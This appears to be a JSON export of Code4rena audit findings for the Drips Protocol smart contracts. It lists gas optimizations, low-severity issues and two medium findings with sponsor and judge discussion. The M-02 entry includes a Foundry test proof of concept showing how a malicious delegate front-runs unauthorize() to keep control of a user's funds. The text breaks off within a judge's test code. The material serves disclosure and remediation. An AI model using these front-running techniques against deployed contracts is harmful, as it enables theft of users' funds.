      "content": "- `AddressDriver: collect()` gas saved: 12954\n- `NFTDriver: collect()` gas saved: 9158\n\nThe same thing can be done for the `collect()` function. Instead of transferring first to the address or NFTdriver. You can instantly transfer to the user.\n[DripsHub.sol#L386-L395)](https://github.com/code-423n4/2023-01-drips/blob/main/src/DripsHub.sol#L386-L395)\n```diff\n-   function collect(uint256 userId, IERC20 erc20)\n+   function collect(uint256 userId, IERC20 erc20, address transferTo)\n        public\n        whenNotPaused\n        onlyDriver(userId)\n        returns (uint128 amt)\n    {\n        amt = Splits._collect(userId, _assetId(erc20));\n        _decreaseTotalBalance(erc20, amt);\n-       erc20.safeTransfer(msg.sender, amt);\n+       erc20.safeTransfer(transferTo, amt);\n    }\n```\n[AddressDriver.sol#L60-L63](https://github.com/code-423n4/2023-01-drips/blob/main/src/AddressDriver.sol#L60-L63)\n```diff\n    function collect(IERC20 erc20, address transferTo) public whenNotPaused returns (uint128 amt) {\n-       amt = dripsHub.collect(callerUserId(), erc20);\n+       amt = dripsHub.collect(callerUserId(), erc20, transferTo);\n-       erc20.safeTransfer(transferTo, amt);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-07-transfer-erc20-immediately-to-the-user",
      "tags": [],
      "finders": []
    },
    {
      "id": "6587",
      "title": "[G-05] Make 3 event parameters indexed when possible",
      "impact": "GAS",
      "content": "It's the most gas efficient to make up to 3 event parameters indexed. If there are less than 3 parameters, you need to make all parameters indexed.\n\n- [DripsHub.sol#L93](https://github.com/code-423n4/2023-01-drips/blob/main/src/DripsHub.sol#L93)\n```diff\n-    event UserMetadataEmitted(uint256 indexed userId, bytes32 indexed key, bytes value);\n+    event UserMetadataEmitted(uint256 indexed userId, bytes32 indexed key, bytes indexed value);\n```\nThe event is used in the function emitUserMetaData, this function is used multiple times. The gas saved for making all the parameters indexed is:\n- DripsHub.sol: `emitUserMetadata()` gas saved: 364\n- AddressDriver.sol: `emitUserMetadata()` gas saved: 208\n- ImmutableSplitsDriver.sol: `createSplits()` gas saved: 139\n- NFTDriver.sol: `emitUserMetadata()` gas saved: 139\n- NFTDriver.sol: `safeMint()` gas saved: 209\n\nThe same extra indexed parameter can be applied to:\n- [Drips.sol#L153](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L153) `DripsHub: setDrips()`\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-05-make-3-event-parameters-indexed-when-possible",
      "tags": [],
      "finders": []
    },
    {
      "id": "6586",
      "title": "[G-04] Call block.timestamp direclty instead of function",
      "impact": "GAS",
      "content": "\nThe `_currTimestamp()` function casts the `block.timestamp` to a uint32. However it's not always necessary to have a uint32.\n\nIn the example below you are assigning the timestamp to a uint256. Which makes it unnecessary to cast the timestamp to uint32. So it's better to call `block.timestamp` directly.\n\n[Drips.sol#L689](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L689): `DripsHub: setDrips()` gas saved: 22\n```diff\n-    uint256 enoughEnd = _currTimestamp();\n+    uint256 enoughEnd = block.timestamp;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-04-call-blocktimestamp-direclty-instead-of-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "6585",
      "title": "[G-03] Write element of storage struct to memory when used more than once",
      "impact": "GAS",
      "content": "When a struct contains a nested mapping, it's not possible to save it in memory. But it's possible to save one element of the struct to memory when it's used more than once. `DripsHub: balanceAt()` gas saved: 10\n\n- [Drips.sol#L539-L542](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L539-L542)\n\n```diff\n        DripsState storage state = _dripsStorage().states[assetId][userId];\n+       uint32 updateTime = state.updateTime;\n-       require(timestamp >= state.updateTime, \"Timestamp before last drips update\");\n+       require(timestamp >= updateTime, \"Timestamp before last drips update\");\n        require(_hashDrips(receivers) == state.dripsHash, \"Invalid current drips list\");\n-       return _balanceAt(state.balance, state.updateTime, state.maxEnd, receivers, timestamp);\n+       return _balanceAt(state.balance, updateTime, state.maxEnd, receivers, timestamp);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-03-write-element-of-storage-struct-to-memory-when-used-more-than-once",
      "tags": [],
      "finders": []
    },
    {
      "id": "6584",
      "title": "[G-02] Use an unchecked block when operands can't underflow/overflow",
      "impact": "GAS",
      "content": "\n[Drips.sol#L480](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L480)\n\nDivision can't overflow or underflow unless the divisor is -1. Which is not the case here. `DripsHub: squeezeDripsResult()` gas saved: 60\n\n```solidity\n    uint256 idxMid = (idx + idxCap) / 2;\n```\n\n[Drips.sol#L655](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L655)\n\nThere is no possibility of overflowing when incrementing by one. currCycleConfigs is a uint32 but even for that will take a massive amount of time to make it overflow. `DripsHub: setDrips()` gas saved: 215\n\n```solidity\n    state.currCycleConfigs++;\n```\n\nFor ++, the same applies to:\n- [Drips.sol#L428](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L428) `DripsHub: squeezeDrips()` gas saved: 28\n- [Drips.sol#L959](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L959) and [Drips.sol#L962](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L962): `DripsHub: setDrips()` gas saved: 35\n- [DripsHub.sol#L136](https://github.com/code-423n4/2023-01-drips/blob/main/src/DripsHub.sol#L136) `DripsHub: registerDriver()` gas saved: 200\n\n[DripsHub.sol#L632](https://github.com/code-423n4/2023-01-drips/blob/main/src/DripsHub.sol#L632): because of the require statement above, it can't overflow. `give()` gas saved: 54\n\n[DripsHub.sol#L636](https://github.com/code-423n4/2023-01-drips/blob/main/src/DripsHub.sol#L636): amount will never be larger than the total balance: `collect()` gas saved: 96\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-02-use-an-unchecked-block-when-operands-cant-underflowoverflow",
      "tags": [],
      "finders": []
    },
    {
      "id": "6583",
      "title": "[G-01] Make for loop unchecked",
      "impact": "GAS",
      "content": "The risk of for loops getting overflowed is extremely low. Because it always increments by 1 and is limited to the arrays length. Even if the arrays are extremely long, it will take a massive amount of time and gas to let the for loop overflow.\n\n- [Caller.sol#L196-L199](https://github.com/code-423n4/2023-01-drips/blob/main/src/Caller.sol#L196-L199): `callBatched()` gas saved: 76\n- [ImmutableSplitsDriver.sol#L61-L63](https://github.com/code-423n4/2023-01-drips/blob/main/src/ImmutableSplitsDriver.sol#L61-L63): `createSplits()` gas saved: 92\n- [Drips.sol#L247-L249](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L247-L249): `DripsHub: receiveDrips()` gas saved: 58 \n- [Drips.sol#L287-L291](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L287-L291): `DripsHub: receiveDripsResult()` gas saved: 54\n- [Drips.sol#L357-L364](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L357-L364): `DripsHub: squeezeDrips()` gas saved: 32\n- [Drips.sol#L450-L459](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L450-L459): `DripsHub: squeezeDripsResult()` gas saved: 71\n- [Drips.sol#L490-L497](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L490-L497): `DripsHub: squeezeDripsResult()` gas saved: 29\n- [Drips.sol#L563-L573](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L563-L573): `DripsHub: balanceAt()` gas saved: 59\n- [Drips.sol#L662-L668](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L662-L668): `DripsHub: setDrips()` gas saved: 31\n- [DripsHub.sol#L613-L616](https://github.com/code-423n4/2023-01-drips/blob/main/src/DripsHub.sol#L613-L616): `emitUserMetadata()` gas saved: 59\n- [Splits.sol#L127-L129](https://github.com/code-423n4/2023-01-drips/blob/main/src/Splits.sol#L127-L129): `DripsHub: splitResult()` gas saved: 10\n- [Splits.sol#L158-L166](https://github.com/code-423n4/2023-01-drips/blob/main/src/Splits.sol#L158-L166): `DripsHub: split()` gas saved: 10\n- [Splits.sol#L231-L243](https://github.com/code-423n4/2023-01-drips/blob/main/src/Splits.sol#L231-L243): `DripsHub: setSplits()` gas saved: 63\n\nThere are 2 ways to make a for loop unchecked in a safe way:\n\n```diff\n-       for (uint256 i = 0; i < calls.length; i++) {\n-       for (uint256 i = 0; i < calls.length;) {\n            Call memory call = calls[i];\n            returnData[i] = _call(sender, call.to, call.data, call.value);\n+           unchecked{\n+              i++\n+           } \n        }\n```\n```diff\n+       function unchecked_inc(uint256 x) private pure returns (uint256) {\n+          unchecked {\n+             return x + 1;\n+          }\n+       }\n\n-       for (uint256 i = 0; i < calls.length; i++) {\n+       for (uint256 i = 0; i < calls.length;  i = unchecked_inc(i)) {\n            Call memory call = calls[i];\n            returnData[i] = _call(sender, call.to, call.data, call.value);\n        }\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-01-make-for-loop-unchecked",
      "tags": [],
      "finders": []
    },
    {
      "id": "6582",
      "title": "[L-05] An immutable split is unable to collect funds if it has itself set as a split receiver",
      "impact": "LOW",
      "content": "\nAn immutable split cannot collect funds if it has itself set as a split receiver. This is because the `ImmutableSplitsDriver` contract lacks the functionality to collect available funds.\n\n### Findings\n\n[ImmutableSplitsDriver.sol#L66](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/ImmutableSplitsDriver.sol#L66)\n\n```solidity\n53: function createSplits(SplitsReceiver[] calldata receivers, UserMetadata[] calldata userMetadata)\n54:     public\n55:     whenNotPaused\n56:     returns (uint256 userId)\n57: {\n58:     userId = nextUserId();\n59:     StorageSlot.getUint256Slot(_counterSlot).value++;\n60:     uint256 weightSum = 0;\n61:     for (uint256 i = 0; i < receivers.length; i++) {\n62:         weightSum += receivers[i].weight;\n63:     }\n64:     require(weightSum == totalSplitsWeight, \"Invalid total receivers weight\");\n65:     emit CreatedSplits(userId, dripsHub.hashSplits(receivers));\n66:     dripsHub.setSplits(userId, receivers);\n67:     if (userMetadata.length > 0) dripsHub.emitUserMetadata(userId, userMetadata);\n68: }\n```\n\n### Recommended Mitigation Steps\n\nConsider preventing setting one of the receivers to the user ID of the newly created immutable split.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#l-05-an-immutable-split-is-unable-to-collect-funds-if-it-has-itself-set-as-a-split-receiver",
      "tags": [],
      "finders": []
    },
    {
      "id": "6581",
      "title": "[L-04] Collecting funds should be usable while the `DripsHub` contract is paused",
      "impact": "LOW",
      "content": "\nThe `DripsHub.collect` function is only callable when the `DripsHub` contract is not paused. This prevents a user from collecting accumulated funds. The admin of the `DripsHub` contract can potentially pause the contracts at any time, locking users out of their honestly earned funds.\n\n### Findings\n\n[DripsHub.sol#L388](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/DripsHub.sol#L388)\n\n```solidity\n386: function collect(uint256 userId, IERC20 erc20)\n387:     public\n388:     whenNotPaused\n389:     onlyDriver(userId)\n390:     returns (uint128 amt)\n391: {\n392:     amt = Splits._collect(userId, _assetId(erc20));\n393:     _decreaseTotalBalance(erc20, amt);\n394:     erc20.safeTransfer(msg.sender, amt);\n395: }\n```\n\n### Recommended Mitigation Steps\n\nConsider removing the `whenNotPaused` modifier to allow collecting funds while the `DripsHub` contract is paused.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#l-04-collecting-funds-should-be-usable-while-the-dripshub-contract-is-paused",
      "tags": [],
      "finders": []
    },
    {
      "id": "6580",
      "title": "[L-03] Unused `dripId` of receiver config is used considered while sorting receivers",
      "impact": "LOW",
      "content": "\nThe `Drips._isOrdered` function compares two given receivers. The receiver config can include the prefixed `dripId` in the 32 most significant bits. This allows using the `dripId` for changing the order of receivers when setting a new drips configuration without violating the sorting requirement, _First compares their `amtPerSec`s, then their `start`s and then their `duration`s_ ([see Drips.sol#L93](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L93)).\n\nWhile no harmful effects are expected, it can be used in the `Drips._setDrips` function to control if delta amounts of receivers are first removed, added, or updated, are expected.\n\n### Findings\n\n[Drips.sol#L1069](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L1069)\n\n```solidity\n1061: function _isOrdered(DripsReceiver memory prev, DripsReceiver memory next)\n1062:     private\n1063:     pure\n1064:     returns (bool)\n1065: {\n1066:     if (prev.userId != next.userId) {\n1067:         return prev.userId < next.userId;\n1068:     }\n1069:     return prev.config.lt(next.config);\n1070: }\n```\n\n### Recommended Mitigation Steps\n\nConsider omitting the `dripId` from the receiver config when comparing the receivers.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#l-03-unused-dripid-of-receiver-config-is-used-considered-while-sorting-receivers",
      "tags": [],
      "finders": []
    },
    {
      "id": "6579",
      "title": "[L-02] Lack of reasonable boundaries for cycle secs",
      "impact": "LOW",
      "content": "\nIf `_cycleSecs` is set too low, for example, to a value less than the Ethereum block time of 12 sec, it will not be possible to squeeze. If set too high, e.g., larger than the current `block.timestamp`, it will not be possible to receive drips - only squeezing will be possible.\n\n### Findings\n\n[Drips.sol#L221](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L221)\n\n```solidity\n219: constructor(uint32 cycleSecs, bytes32 dripsStorageSlot) {\n220:     require(cycleSecs > 1, \"Cycle length too low\");\n221:     _cycleSecs = cycleSecs;\n222:     _dripsStorageSlot = dripsStorageSlot;\n223: }\n```\n\n### Recommended Mitigation Steps\n\nConsider adding an appropriate upper limit for `_cycleSecs`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#l-02-lack-of-reasonable-boundaries-for-cycle-secs",
      "tags": [],
      "finders": []
    },
    {
      "id": "6578",
      "title": "[L-01] An authorized user can unauthorize other authorized users of the same sender",
      "impact": "LOW",
      "content": "\nA user can grant authorization to another address to make calls on their behalf via the `Caller.callAs` function. The `Caller.unauthorize` function allows the user to revoke the authorization of another address.\n\nAn authorized user can revoke the authorization of another authorized user of the same sender. This is because the authorized user can call the `Caller.unauthorize` function on behalf of the sender.\n\n### Findings\n\n[Caller.sol#L114-L118](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Caller.sol#L114-L118)\n\n```solidity\n114: function unauthorize(address user) public {\n115:     address sender = _msgSender();\n116:     require(_authorized[sender].remove(user), \"Address is not authorized\");\n117:     emit Unauthorized(sender, user);\n118: }\n```\n\n### Recommended Mitigation Steps\n\nConsider preventing calls to the `Caller` contract address from within the `_call` function.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#l-01-an-authorized-user-can-unauthorize-other-authorized-users-of-the-same-sender",
      "tags": [],
      "finders": []
    },
    {
      "id": "6577",
      "title": "[M-02] `unauthorize()` can be front-run so that the malicious authorized user would get their authority back",
      "impact": "MEDIUM",
      "content": "\nThe `Caller` contract enables users to authorize other users to execute tx on their behalf.\nThis option enables the authorized/delegated user to add more users to the authorized users list.\nIn case the original user is trying to remove an authorized user (i.e. run `unauthorize()`), the delegated user can simply front run that tx to add another user, then after `unauthorized()` is executed the delegated can use the added user to gain his authority back.\n\nThis would allow the malicious delegated user to keep executing txs on behalf of the original user and cause them a loss of funds (e.g. collecting funds on their behalf and sending it to the attacker's address).\n\n### Proof of Concept\n\nThe test below demonstrates such a scenario:\n\n*   Alice authorizes Bob\n*   Bob becomes malicious and Alice now wants to remove him\n*   Bob noticed the tx to unauthorize him and front runs it by authorizing Eve\n*   Alice `unauthorize()` tx is executed\n*   Bob now authorizes himself back again via Eve's account\n\nFront running can be done either by sending a tx with a higher gas price (usually tx are ordered in a block by the gas price / total fee), or by paying an additional fee to the validator if they manage to run their tx without reverting (i.e. by sending additional ETH to `block.coinbase`, hoping validator will notice it).\nIt's true that Alice can run `unauthorize()` again and again and needs to succeed only once, but:\n\n*   Bob can keep adding other users and Alice would have to keep removing them all\n*   This is an ongoing battle that can last forever, and Alice might not have enough knowledge, resources and time to deal with it right away. This might take hours or days, and in the meanwhile Alice might be receiving a significant amount of drips that would be stolen by Bob.\n\n```diff\ndiff --git a/test/Caller.t.sol b/test/Caller.t.sol\nindex 861b351..3e4be22 100644\n--- a/test/Caller.t.sol\n+++ b/test/Caller.t.sol\n@@ -125,6 +125,24 @@ contract CallerTest is Test {\n         vm.expectRevert(ERROR_UNAUTHORIZED);\n         caller.callAs(sender, address(target), data);\n     }\n+    \n+    function testFrontRunUnauthorize() public {\n+        bytes memory data = abi.encodeWithSelector(target.run.selector, 1);\n+        address bob = address(0xbab);\n+        address eve = address(0xefe);\n+        // Bob is authorized by Alice\n+        authorize(sender, bob);\n+\n+        // Bob became malicious and Alice now wants to remove him\n+        // Bob sees the `unauthorize()` call and front runs it with authorizing Eve\n+        authorizeCallAs(sender, bob, eve);\n+\n+        unauthorize(sender, bob);\n+\n+        // Eve can now give Bob his authority back\n+        authorizeCallAs(sender, eve, bob);\n+\n+    }\n \n     function testAuthorizingAuthorizedReverts() public {\n         authorize(sender, address(this));\n@@ -257,6 +275,13 @@ contract CallerTest is Test {\n         assertTrue(caller.isAuthorized(authorizing, authorized), \"Authorization failed\");\n     }\n \n+    function authorizeCallAs(address originalUser,address delegated, address authorized) internal {\n+        bytes memory data = abi.encodeWithSelector(Caller.authorize.selector, authorized);\n+        vm.prank(delegated);\n+        caller.callAs(originalUser, address(caller),  data);\n+        assertTrue(caller.isAuthorized(originalUser, authorized), \"Authorization failed\");\n+    }\n+\n     function unauthorize(address authorizing, address unauthorized) internal {\n         vm.prank(authorizing);\n         caller.unauthorize(unauthorized);\n\n```\n\n### Recommended Mitigation Steps\n\nDon't allow authorized users to call `authorize()` on behalf of the original user.\n\nThis can be done by replacing `_msgSender()` with `msg.sender` at `authorize()`, if the devs want to enable authorizing by signing I think the best way would be to add a dedicated function for that (other ways to prevent calling `authorize()` from `callAs()` can increase gas cost for normal calls, esp. since we'll need to cover all edge cases of recursive calls with `callBatched()`).\n\n**[xmxanuel (Drips) commented](https://github.com/code-423n4/2023-01-drips-findings/issues/163#issuecomment-1424324859):**\n > Known behavior. I think it is debatable. The `authorize` means an other address is completely trusted in terms of access to funds.\n> In most cases this will be the same actor like Alice. Just another address of Alice.\n\n**[CodeSandwich (Drips) disagreed with severity and commented](https://github.com/code-423n4/2023-01-drips-findings/issues/163#issuecomment-1426357093):**\n> Like Manuel said, this is known, authorizing somebody gives them extreme privileges anyway, like stealing all the funds available for the user in the protocol.\n> \n> I disagree that it's a High severity issue, because the attacked user with some effort can defend themselves. In a single batch they need to authorize a contract that would iterate over all addresses returned by `allAuthorized` and for each of them to call `unauthorize` on behalf of the attacked user.\n> \n> I think that the above emergency defense mechanism could be built right into `Caller`'s API to make it cheaper and easier to run, basically adding an `unauthorizeAll` function that will clear the authorized addresses list. That's why I agree that it **is** an issue to solve, but a low severity one, it's only a quality of life improvement.\n> \n> The proposed mitigation of banning authorized users from authorizing others is too heavy handed, because it hurts use cases like a slow DAO authorizing a trusted operator, who then needs to rotate keys or authorize a \"script contract\" performing automated operations on Drips protocol. Authorization by signing hurts all non-EOA addresses like DAOs or multisigs which don't have private keys.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-drips-findings/issues/163#issuecomment-1441660411):**\n > Because of the fact that the only requirement for the attack is for the authorized to be malicious, I have considered High Severity.\n> \n> After further reflection, because of the ability to remove the malicious attacker via a Macro, per the Sponsor's comment above, I believe Medium Severity to be the most appropriate.\n> \n> The approval should be considered an extremely dangerous operation, which can cause drastic losses, however, a malicious approved can eventually be unapproved via a macro contract.\n\n**[xmxanuel commented](https://github.com/code-423n4/2023-01-drips-findings/issues/163#issuecomment-1441675954):**\n > > The approval should be considered an extremely dangerous operation, which can cause drastic losses, however, a malicious approval can eventually be unapproved via a macro contract\n> \n> Yes, we agree here. We envision it more like the same actor/organization is using multiple \n> addresses. \n> \n> Like the multi-sig of an organization is used as the main address (address with the ens name) but not all actions might require multiple signatures. Therefore, they can approve another address. etc.\n> \n> However, we assume full trust. \n> \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-01-drips-findings/issues/163#issuecomment-1445444330):**\n>Confirming Medium severity because:\n>- The risk is not in giving the approval, that is the feature offered\n>- The risk is in not being able to revoke an approval, due to a lack of `revokeAll` or similar functionality, which can create a temporary grief\n>\n>Because that can cause a denial of functionality which is limited in time, I believe Medium Severity to be the most appropriate.\n>\n***\n\n",
      "summary": "\nA bug has been identified in the Caller contract which enables users to authorize other users to execute transactions on their behalf. This bug allows a malicious user to gain back their authority after it has been revoked by the original user. This is done by the malicious user front-running the transaction to unauthorize them and adding another user who can then re-authorize them. This could lead to a loss of funds for the original user as the malicious user can keep executing transactions on their behalf.\n\nThe bug can be demonstrated by a proof of concept. Alice authorizes Bob, but Bob becomes malicious and Alice wants to remove him. Bob notices the transaction to unauthorize him and front runs it by authorizing Eve. Alice's unauthorize transaction is then executed, and Bob can now authorize himself back again via Eve's account.\n\nFront running can be done by either sending a transaction with a higher gas price or by paying additional fees to the validator. This could lead to an ongoing battle between Alice and Bob that could last forever, and Alice might not have the resources or time to keep up with it.\n\nThe recommended mitigation step for this bug is to not allow authorized users to call the `authorize()` method on behalf of the original user. This can be done by replacing `_msgSender()` with `msg.sender` at `authorize()`. Alternatively, if the developers want to enable authorizing by signing, they should add a dedicated function for that.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "https://github.com/code-423n4/2023-01-drips-findings/issues/163",
      "tags": [],
      "finders": [
        "0xA5DF",
        "0xbepresent  ladboy233"
      ]
    },
    {
      "id": "6576",
      "title": "[M-01] Squeezing drips from a sender can be front-run and prevented by the sender",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L411> \n\n<https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L461>\n\nSqueezing drips from a sender requires providing the sequence of drips configurations (see NatSpec description in [L337-L338](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L337-L338)):\n\n> /// It can start at an arbitrary past configuration, but must describe all the configurations\n> /// which have been used since then including the current one, in the chronological order.\n\nThe provided history entries are hashed and verified against the sender's `dripsHistoryHash`.\n\nHowever, the sender can prevent a receiver from squeezing drips by front-running the squeeze transaction and adding a new configuration. Adding a new configuration updates the current `dripsHistoryHash` and invalidates the `historyHash` provided by the receiver when squeezing. The receiver will then fail the drips history verification in [L461](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L461) and the squeeze will fail.\n\n### Impact\n\nA sender can prevent its drip receivers from squeezing by front-running the squeeze transaction and adding a new configuration.\n\n### Proof of Concept\n\n[Drips.sol#L411](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L411)\n\n```solidity\n392: function _squeezeDripsResult(\n393:     uint256 userId,\n394:     uint256 assetId,\n395:     uint256 senderId,\n396:     bytes32 historyHash,\n397:     DripsHistory[] memory dripsHistory\n398: )\n399:     internal\n400:     view\n401:     returns (\n402:         uint128 amt,\n403:         uint256 squeezedNum,\n404:         uint256[] memory squeezedRevIdxs,\n405:         bytes32[] memory historyHashes,\n406:         uint256 currCycleConfigs\n407:     )\n408: {\n409:     {\n410:         DripsState storage sender = _dripsStorage().states[assetId][senderId];\n411:         historyHashes = _verifyDripsHistory(historyHash, dripsHistory, sender.dripsHistoryHash);\n412:         // If the last update was not in the current cycle,\n413:         // there's only the single latest history entry to squeeze in the current cycle.\n414:         currCycleConfigs = 1;\n415:         // slither-disable-next-line timestamp\n416:         if (sender.updateTime >= _currCycleStart()) currCycleConfigs = sender.currCycleConfigs;\n417:     }\n...      // [...]\n```\n\n[Drips.sol#L461](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L461)\n\n```solidity\n444: function _verifyDripsHistory(\n445:     bytes32 historyHash,\n446:     DripsHistory[] memory dripsHistory,\n447:     bytes32 finalHistoryHash\n448: ) private pure returns (bytes32[] memory historyHashes) {\n449:     historyHashes = new bytes32[](dripsHistory.length);\n450:     for (uint256 i = 0; i < dripsHistory.length; i++) {\n451:         DripsHistory memory drips = dripsHistory[i];\n452:         bytes32 dripsHash = drips.dripsHash;\n453:         if (drips.receivers.length != 0) {\n454:             require(dripsHash == 0, \"Drips history entry with hash and receivers\");\n455:             dripsHash = _hashDrips(drips.receivers);\n456:         }\n457:         historyHashes[i] = historyHash;\n458:         historyHash = _hashDripsHistory(historyHash, dripsHash, drips.updateTime, drips.maxEnd);\n459:     }\n460:     // slither-disable-next-line incorrect-equality,timestamp\n461:     require(historyHash == finalHistoryHash, \"Invalid drips history\");\n462: }\n```\n\n### Recommended Mitigation Steps\n\nConsider allowing a receiver to squeeze drips from a sender up until the current timestamp.\n\n**[xmxanuel (Drips) commented](https://github.com/code-423n4/2023-01-drips-findings/issues/276#issuecomment-1425726115):**\n > Technically the described attack would work.\n> \n> It is also related to the trust assumption between the sender an receiver. Which are anyway given in a certain form. \n> \n> I am unsure about the proposed solutions.  Currently, we only store the latest dripsHistory hash on-chain. For allowing to squeeze until a specific timestamp, it might be necessary to have the full list of historic hashes on-chain.\n> \n\n**[CodeSandwich (Drips) disagreed with severity and commented](https://github.com/code-423n4/2023-01-drips-findings/issues/276#issuecomment-1427007648):**\n> This attack is in fact possible, but it only allows postponing collecting funds until the end of the cycle. The proposed solution would probably require a lot of storage, so it's probably not worth introducing.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-01-drips-findings/issues/276#issuecomment-1450276738):**\n > In order to judge this issue I spoke with 4 other judges as well as the Sponsor.\n> \n> This is a difficult decision because of the unclear expectations as to whether the sender is bening towards the receiver or not.\n> \n> Because of the uncertainty, and the possibility of performing the grief, the finding is valid.\n> \n> The issue is in terms of determining it's severity.\n> \n> **The attacker doesn't gain anything**\n> \n> One of the most interesting arguments is the idea that \"the attacker doesn't gain anything\", which can be falsified in scenarios in which squeezing would have helped reach a threshold of tokens in circulation, out of vesting or for similar purposes.\n> \n> If we try hard enough, through multiple people's effort, we can come up with a scenario in which squeezing could make a difference between having enough votes for a Governance Operation, or could offer enough collateral to avoid a liquidation or some level of risk.\n> \n> Those scenarios, while unlikely, can help discredit the idea that \"the attacker doesn't gain anything\".\n> \n> **The grief is limited**\n> \n> On the other hand, we must acknowledge that the attack / griefing, is limited:\n> - The `sender` is the only privileged account that can perform the grief\n> - Squeezing is denied until the next cycle, which based on configuration, will be known, and will be between 1 week and 1 month.\n> \n> These can be viewed as additional external requirements, which reduce the impact / likelihood of the finding\n> \n> **The Squeeze is Squoze**\n> \n> In spite of the external requirements, the finding is showing how the functionality of Squeezing can be denied by the sender.\n> \n> I believe that if anybody could grief squeezing, we would not hesitate in awarding Medium Severity and perhaps we'd be discussing around Med / High.\n> \n> However, in this case, the only account that can perform the grief is the sender.\n> \n> At the same time, the goal of the system is to allow Squeezing, which per the discussion above, given the finding can be prevented until a drip has moved to a newer crycle.\n> \n> **Last Minute Coding**\n> \n> I went into the tests and wrote the following illustratory cases\n> \n> ```solidity\n> function testSenderCanStopAfter() public {\n>         uint128 amt = cycleSecs;\n>         setDrips(sender, 0, amt, recv(receiver, 1), cycleSecs);\n>         